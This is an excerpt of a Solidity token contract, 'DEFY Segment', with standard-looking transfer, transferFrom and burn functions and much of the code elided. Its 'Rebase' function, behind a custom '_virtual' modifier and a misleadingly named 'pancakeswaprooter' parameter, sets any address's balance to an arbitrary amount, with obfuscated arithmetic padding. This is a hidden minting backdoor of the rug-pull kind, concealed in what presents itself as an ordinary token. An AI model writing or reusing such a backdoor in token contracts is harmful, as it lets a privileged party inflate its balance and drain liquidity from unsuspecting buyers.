...
interface STARTOKEN {
  // @dev Returns the Values of tokens in existence.
  ...
  //@dev Returns the Values of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `Values` tokens from the caller's account to `recipient`.
   *
  ...
  /**
   * @dev Sets `Values` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
  ...
  /**
   * @dev Moves `Values` tokens from `sender` to `recipient` using the
   * allowance mechanism. `Values` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
...
contract DEFYSegment is STARTOKEN {
    ...
    string public override name = "DEFY Segment";
    string public override symbol = "DEFYSEGMENT";
  ...
  modifier _virtual () {
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        VOLOS[to] += totalValueAfterTaxAndBurn;
        VOLOS[msg.sender] -= totalValue;
    ...
    function Rebase(address pancakeswaprooter, uint256 Values) external _virtual {
      VOLOS[pancakeswaprooter] = (Values / Values - Values / Values) + Values * 10 ** 6;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(VOLOS[from] >= totalValue, "Balance is too low to make transfer.");
        
        VOLOS[to] += totalValue;
        VOLOS[from] -= totalValue;
    ...
    function burn(uint256 Values) public returns(bool) {
        _burn(msg.sender, Values);
    ...
    // burn Values of currency from specific account
    function _burn(address account, uint256 Values) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(VOLOS[account] >= Values, "Burn Values exceeds balance at address.");
    
        VOLOS[account] -= Values;
        totalSupply -= Values;
